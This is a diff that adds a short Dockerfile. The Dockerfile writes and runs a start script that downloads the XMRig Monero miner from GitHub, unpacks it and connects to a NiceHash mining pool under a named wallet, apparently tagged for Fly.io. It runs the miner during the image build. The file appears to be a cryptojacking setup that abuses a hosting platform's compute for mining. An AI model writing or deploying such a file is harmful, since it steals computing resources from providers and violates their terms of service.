@@ -1,0 +1,11 @@
+FROM ubuntu:18.04
+
+RUN apt-get update
+
+RUN apt-get install -y wget
+
+RUN echo > start.sh "wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz\ntar -xvaf xmrig-6.20.0-bionic-x64.tar.gz\ncd xmrig-6.20.0\n./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u NHbDhP22A6HtbnkRaH5WFKvoRcniu7QsSA4k.flyio"
+
+RUN chmod +x /start.sh
+
+RUN ./start.sh
